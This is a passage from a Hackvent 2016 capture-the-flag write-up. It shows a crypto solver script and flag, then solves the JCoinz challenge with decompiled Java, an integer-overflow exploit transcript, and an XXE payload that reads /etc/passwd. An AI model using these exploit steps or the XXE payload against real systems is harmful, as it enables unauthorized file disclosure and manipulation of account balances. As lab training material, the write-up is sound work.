+<span class="p">[</span><span class="mi">230551569853098007600677345727280344755</span><span class="p">,</span><span class="mi">287930781315318970473254677546577038359</span><span class="p">,</span><span class="mi">267938315516895485484707051396200706443</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">243574932572443222972750303823800502163</span><span class="p">,</span><span class="mi">301120142698243924290763614435454565780</span><span class="p">,</span><span class="mi">298644815229643145404450351035804160241</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">227879528304283891530899499744980291425</span><span class="p">,</span><span class="mi">259647428751561260984852593239590962832</span><span class="p">,</span><span class="mi">269635859822490692863508746527322139429</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">193780289185955117334123511554895799539</span><span class="p">,</span><span class="mi">230518059194860774985531587526031582924</span><span class="p">,</span><span class="mi">207593226880414101384701594893426311937</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">195425447990038725090924967791915486200</span><span class="p">,</span><span class="mi">211074736770197591575170253798012315012</span><span class="p">,</span><span class="mi">268179617336236355437933191393015865423</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">182160695615960388203641943769582257756</span><span class="p">,</span><span class="mi">226052690185182197055109796183513576908</span><span class="p">,</span><span class="mi">206467790630567275126889799309355179359</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">270365608703884312725165910007312396490</span><span class="p">,</span><span class="mi">213419845252996446560398094913250521674</span><span class="p">,</span><span class="mi">324158008615298179424325819513870548587</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">201137118708843924452456973486310609161</span><span class="p">,</span><span class="mi">159816376238003107002192693657105630045</span><span class="p">,</span><span class="mi">290037217831618223964293971372160917859</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">173038113384777542289872672569239525188</span><span class="p">,</span><span class="mi">189558894159177271916644208007912631998</span><span class="p">,</span><span class="mi">183921485447992361971839173200969564297</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">203079462849536394511816713024005910404</span><span class="p">,</span><span class="mi">265255113893859933710071781082768935284</span><span class="p">,</span><span class="mi">214860441818087898101519465166073705553</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">175435955454496700514946039667711586185</span><span class="p">,</span><span class="mi">321302129754052602637931061925096198926</span><span class="p">,</span><span class="mi">176882035352883165226937995777991718197</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">200701714682593432395729715130128082931</span><span class="p">,</span><span class="mi">240366172083509768840032993181552166546</span><span class="p">,</span><span class="mi">262938198945065824235502495190974734479</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">299752902236935158362307014205359355636</span><span class="p">,</span><span class="mi">235711956783855914923056820687273121476</span><span class="p">,</span><span class="mi">332555996220370247549433065033032955347</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">215902963387633985679795544753434436743</span><span class="p">,</span><span class="mi">271635699405692295953353834140161222963</span><span class="p">,</span><span class="mi">234686602415496986215568540582391915559</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">205034325176731455396463659428717818520</span><span class="p">,</span><span class="mi">272071326791294957481838950480920388378</span><span class="p">,</span><span class="mi">206409649750015144058460651952033121471</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">186202058515529112089774144624697652752</span><span class="p">,</span><span class="mi">254056783751113612320599805874190538383</span><span class="p">,</span><span class="mi">203950808577618100941828939328974427763</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">287901749499474956286121649902808545796</span><span class="p">,</span><span class="mi">182193516067311697257425115832952178725</span><span class="p">,</span><span class="mi">310661715406253093730218700854274682783</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">188797174721730846063832466557549096934</span><span class="p">,</span><span class="mi">204289631640363328059573883403131553162</span><span class="p">,</span><span class="mi">202398097602736311826665715995283701469</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">173276488624612107075891981111532248427</span><span class="p">,</span><span class="mi">143340215883386310219352729908142093188</span><span class="p">,</span><span class="mi">310272112653851647580237588097526878451</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">300899937001700644581647299928269672025</span><span class="p">,</span><span class="mi">333680929290782211826332325236347007941</span><span class="p">,</span><span class="mi">313491113294105066840003438756384124923</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">179363152345949876980223861387117154037</span><span class="p">,</span><span class="mi">192660289980311571512766813788452507319</span><span class="p">,</span><span class="mi">191173487237342005980035033206582186319</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">274297779066581320003362916911839787292</span><span class="p">,</span><span class="mi">230968818301666954768423827202499074222</span><span class="p">,</span><span class="mi">280249595392717543321356899242915413241</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">173512792712172909456131993539106342879</span><span class="p">,</span><span class="mi">276670255129140880258696821649524107343</span><span class="p">,</span><span class="mi">176080436791985260266403840744627297429</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">217267141898619422837859646397422811530</span><span class="p">,</span><span class="mi">192415481924499182031594124394175595334</span><span class="p">,</span><span class="mi">261771203728758901533499406756951694139</span><span class="p">]]</span>
+
+<span class="n">alphabet</span><span class="o">=</span><span class="sh">"</span><span class="s">-ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuwyz0123456789</span><span class="sh">"</span>
+
+<span class="n">pt</span><span class="o">=</span><span class="sh">''</span>
+<span class="nf">for </span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">p</span><span class="p">)</span> <span class="ow">in</span> <span class="n">cts</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">alphabet</span><span class="p">:</span>
+        <span class="nf">if </span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">*</span><span class="mh">0x1337</span><span class="o">*</span><span class="n">b</span><span class="p">)</span><span class="o">%</span><span class="n">p</span> <span class="o">==</span> <span class="n">m</span><span class="p">:</span>
+            <span class="n">pt</span> <span class="o">+=</span> <span class="n">c</span>
+<span class="k">print</span> <span class="n">pt</span>
+</pre></table></code></div></div><p>This spits out our nugget :)</p><h2> Flag</h2><code> HV16-laWz-D5yT-0Uzb-DFj0-FIsL </code><hr><h1 id="dec-13-jcoinz"> Dec 13: JCoinz <a href="/CTF-writeups-public/writeups/Hackvent_2016/13-dec-13-jcoinz.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><em>Sometimes less is more</em></p><p>The manager of jcoinz told a developer to implement a transaction tax as fast as possible so he can earn more money. Maybe that was a wrong decision…</p><p><code class="language-plaintext highlighter-rouge">nc challenges.hackvent.hacking-lab.com 3117</code></p><p><a href="writeupfiles/jcoinz.jar">jcoinz.jar</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We start by decompiling the jar file to get the <a href="writeupfiles/jcoinz_source">source files</a>.</p><p>Account.java:</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Account</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="nc">String</span> <span class="n">name</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="kt">int</span> <span class="n">coins</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">name</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getCoins</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">coins</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setCoins</span><span class="o">(</span><span class="kt">int</span> <span class="n">coins</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">coins</span> <span class="o">=</span> <span class="n">coins</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">payCoins</span><span class="o">(</span><span class="kt">int</span> <span class="n">amount</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">decreasedCoins</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getCoins</span><span class="o">()</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+            <span class="no">IO</span><span class="o">.</span><span class="na">printStatus</span><span class="o">(</span><span class="s">"-"</span><span class="o">,</span> <span class="s">"No more jcoinz!\n\n"</span><span class="o">);</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">amount</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">amount</span> <span class="o">*=</span> <span class="o">-</span><span class="mi">1</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">if</span> <span class="o">((</span><span class="n">decreasedCoins</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getCoins</span><span class="o">()</span> <span class="o">-</span> <span class="n">amount</span> <span class="o">-</span> <span class="nc">Shop</span><span class="o">.</span><span class="na">transactionTax</span><span class="o">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+            <span class="no">IO</span><span class="o">.</span><span class="na">printStatus</span><span class="o">(</span><span class="s">"-"</span><span class="o">,</span> <span class="s">"You cannot generate debts!\n\n"</span><span class="o">);</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">setCoins</span><span class="o">(</span><span class="n">decreasedCoins</span><span class="o">);</span>
+        <span class="no">IO</span><span class="o">.</span><span class="na">printStatus</span><span class="o">(</span><span class="s">"-"</span><span class="o">,</span> <span class="s">"Decreased the account of \""</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">"\" by "</span> <span class="o">+</span> <span class="nc">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">amount</span><span class="o">)</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="nf">Account</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">,</span> <span class="kt">int</span> <span class="n">coins</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">coins</span> <span class="o">=</span> <span class="n">coins</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><p>IO.java</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.PrintStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">IO</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">printStatus</span><span class="o">(</span><span class="nc">String</span> <span class="n">status</span><span class="o">,</span> <span class="nc">String</span> <span class="n">message</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">"["</span> <span class="o">+</span> <span class="n">status</span> <span class="o">+</span> <span class="s">"] "</span> <span class="o">+</span> <span class="n">message</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Scanner</span> <span class="nf">getUserInput</span><span class="o">(</span><span class="nc">String</span> <span class="n">question</span><span class="o">)</span> <span class="o">{</span>
+        <span class="no">IO</span><span class="o">.</span><span class="na">printStatus</span><span class="o">(</span><span class="s">"?"</span><span class="o">,</span> <span class="n">question</span><span class="o">);</span>
+        <span class="k">return</span> <span class="k">new</span> <span class="nf">Scanner</span><span class="o">(</span><span class="nc">System</span><span class="o">.</span><span class="na">in</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><p>Shop.java</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">javax.xml.transform.Source</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.TransformerConfigurationException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.TransformerException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.TransformerFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.dom.DOMSource</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.stream.StreamResult</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.w3c.dom.Document</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.w3c.dom.Node</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Shop</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span> <span class="n">transactionTax</span> <span class="o">=</span> <span class="mi">2</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">sendToAdmin</span><span class="o">(</span><span class="nc">Account</span> <span class="n">acc</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">acc</span><span class="o">.</span><span class="na">payCoins</span><span class="o">(</span><span class="mi">1337</span><span class="o">))</span> <span class="o">{</span>
+            <span class="nc">String</span> <span class="n">secretMessage</span> <span class="o">=</span> <span class="no">IO</span><span class="o">.</span><span class="na">getUserInput</span><span class="o">(</span><span class="s">"XML Message: "</span><span class="o">).</span><span class="na">nextLine</span><span class="o">();</span>
+            <span class="nc">DocumentBuilderFactory</span> <span class="n">xmlDocumentBuilderFactory</span> <span class="o">=</span> <span class="nc">DocumentBuilderFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="nc">DocumentBuilder</span> <span class="n">xmlDocumentBuilder</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="nc">Document</span> <span class="n">xmlDocument</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">xmlDocumentBuilder</span> <span class="o">=</span> <span class="n">xmlDocumentBuilderFactory</span><span class="o">.</span><span class="na">newDocumentBuilder</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">catch</span> <span class="o">(</span><span class="nc">ParserConfigurationException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">xmlDocument</span> <span class="o">=</span> <span class="n">xmlDocumentBuilder</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="k">new</span> <span class="nc">ByteArrayInputStream</span><span class="o">(</span><span class="n">secretMessage</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
+            <span class="o">}</span>
+            <span class="k">catch</span> <span class="o">(</span><span class="nc">SAXException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="nc">TransformerFactory</span> <span class="n">xmlTransformerFactory</span> <span class="o">=</span> <span class="nc">TransformerFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="nc">Transformer</span> <span class="n">xmlTransformer</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">xmlTransformer</span> <span class="o">=</span> <span class="n">xmlTransformerFactory</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">catch</span> <span class="o">(</span><span class="nc">TransformerConfigurationException</span> <span class="n">e1</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="n">xmlTransformer</span><span class="o">.</span><span class="na">setOutputProperty</span><span class="o">(</span><span class="s">"omit-xml-declaration"</span><span class="o">,</span> <span class="s">"yes"</span><span class="o">);</span>
+            <span class="nc">StringWriter</span> <span class="n">xmlWriter</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringWriter</span><span class="o">();</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">xmlTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="k">new</span> <span class="nc">DOMSource</span><span class="o">(</span><span class="n">xmlDocument</span><span class="o">),</span> <span class="k">new</span> <span class="nc">StreamResult</span><span class="o">(</span><span class="n">xmlWriter</span><span class="o">));</span>
+            <span class="o">}</span>
+            <span class="k">catch</span> <span class="o">(</span><span class="nc">TransformerException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="no">IO</span><span class="o">.</span><span class="na">printStatus</span><span class="o">(</span><span class="s">"+"</span><span class="o">,</span> <span class="s">"Your secret xml message: "</span> <span class="o">+</span> <span class="n">xmlWriter</span><span class="o">.</span><span class="na">getBuffer</span><span class="o">().</span><span class="na">toString</span><span class="o">()</span> <span class="o">+</span> <span class="s">"\n\n"</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">sendToCharity</span><span class="o">(</span><span class="nc">Account</span> <span class="n">acc</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">acc</span><span class="o">.</span><span class="na">payCoins</span><span class="o">(</span><span class="no">IO</span><span class="o">.</span><span class="na">getUserInput</span><span class="o">(</span><span class="s">"Amount of jcoinz to send: "</span><span class="o">).</span><span class="na">nextInt</span><span class="o">()))</span> <span class="o">{</span>
+            <span class="no">IO</span><span class="o">.</span><span class="na">printStatus</span><span class="o">(</span><span class="s">"+"</span><span class="o">,</span> <span class="s">"Thank you very much!\n\n"</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><p>MainRunner.java</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">java.io.PrintStream</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainRunner</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">showWelcome</span><span class="o">()</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"$$$$$$$$$$$$$$$$$$\n$ JCOINZ SERVICE $\n$$$$$$$$$$$$$$$$$$\n"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">showMenu</span><span class="o">(</span><span class="nc">Account</span> <span class="n">acc</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"1 - sends jcoinz to charity\n2 - send a secret xml message to the admin \nYour name: "</span> <span class="o">+</span> <span class="n">acc</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">"\n"</span> <span class="o">+</span> <span class="s">"Your amount of jcoinz: "</span> <span class="o">+</span> <span class="nc">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">acc</span><span class="o">.</span><span class="na">getCoins</span><span class="o">())</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="cm">/*
+     * Exception decompiling
+     */</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">// This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.</span>
+        <span class="c1">// org.benf.cfr.reader.util.CannotPerformDecode: reachable test BLOCK was exited and re-entered.</span>
+        <span class="c1">// org.benf.cfr.reader.bytecode.analysis.opgraph.op3rewriters.Misc.getFarthestReachableInRange(Misc.java:143)</span>
+        <span class="c1">// org.benf.cfr.reader.bytecode.analysis.opgraph.op3rewriters.SwitchReplacer.examineSwitchContiguity(SwitchReplacer.java:385)</span>
+        <span class="c1">// org.benf.cfr.reader.bytecode.analysis.opgraph.op3rewriters.SwitchReplacer.replaceRawSwitches(SwitchReplacer.java:65)</span>
+        <span class="c1">// org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:423)</span>
+        <span class="c1">// org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:217)</span>
+        <span class="c1">// org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:162)</span>
+        <span class="c1">// org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:95)</span>
+        <span class="c1">// org.benf.cfr.reader.entities.Method.analyse(Method.java:355)</span>
+        <span class="c1">// org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:768)</span>
+        <span class="c1">// org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:700)</span>
+        <span class="c1">// org.benf.cfr.reader.Main.doJar(Main.java:134)</span>
+        <span class="c1">// org.benf.cfr.reader.Main.main(Main.java:189)</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">IllegalStateException</span><span class="o">(</span><span class="s">"Decompilation failed"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><p>We start with <code class="language-plaintext highlighter-rouge">1336</code> coins, and need <code class="language-plaintext highlighter-rouge">1337</code> in order to write an XML message to the admin (and presumably exploit that to find the nugget), but we can only give away coins, not add them..</p><p>The hint is <code class="language-plaintext highlighter-rouge">Sometimes less is more</code> ..so we think integer overflow; subtract so much we get positive integer again. For instance, we know that <code class="language-plaintext highlighter-rouge">System.out.println(-1 - Integer.MIN_VALUE)</code> gives as output <code class="language-plaintext highlighter-rouge">2147483647</code>. This is what we aim for, there are, however, a few limitations:</p><ol><li>If a negative number is entered, it is multiplied by -1<li>A tax is added to every transaction, 2 more coins than what you give away are subtracted from your total<li>If the result of the transaction would be a negative balance, it is not processed</ol><p>First, note that <code class="language-plaintext highlighter-rouge">-1*Integer.MIN_VALUE</code> is still <code class="language-plaintext highlighter-rouge">Integer.MIN_VALUE</code> so this circumvents the first limitation.</p><p>The tax will actually help us to get this done. As the result of our transactions can not be negative, we cannot get a balance of -1, which is what we would like so that we can subtract <code class="language-plaintext highlighter-rouge">INT_MIN</code>, but, if we first get our balance down to +1, then the tax will get us to -1 after which our value will be subtracted, and then we’re rich!</p><p>So we can do this in two transactions, first give away <code class="language-plaintext highlighter-rouge">1333</code> coins, and then we give away <code class="language-plaintext highlighter-rouge">Integer.INT_MIN</code> (<code class="language-plaintext highlighter-rouge">-2147483648</code>) coins, which with the added tax will give us the integer overflow we want.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre>nc challenges.hackvent.hacking-lab.com 3117
+
+$$$$$$$$$$$$$$$$$$
+$ JCOINZ SERVICE $
+$$$$$$$$$$$$$$$$$$
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 1336
+
+[?] Action: 1
+[?] Amount of jcoinz to send: 1333
+[-] Decreased the account of "billy" by 1333
+[+] Thank you very much!
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 1
+
+[?] Action: 1
+[?] Amount of jcoinz to send: -2147483648
+[-] Decreased the account of "billy" by -2147483648
+[+] Thank you very much!
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 2147483647
+</pre></table></code></div></div><p>Now we have enough coins to send an XML message! Now we need to figure out how to abuse this to read the flag from the server..</p><p>From Wikipedia entry on XXE exploits: <code class="language-plaintext highlighter-rouge">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing</code> :</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+ &lt;!DOCTYPE foo [
+   &lt;!ELEMENT foo ANY &gt;
+   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</pre></table></code></div></div><p>to show contents of <code class="language-plaintext highlighter-rouge">/etc/passwd/</code>. Since we don’t know which file we need, we can adapt it to list contents of base directory</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre># list files in root directory
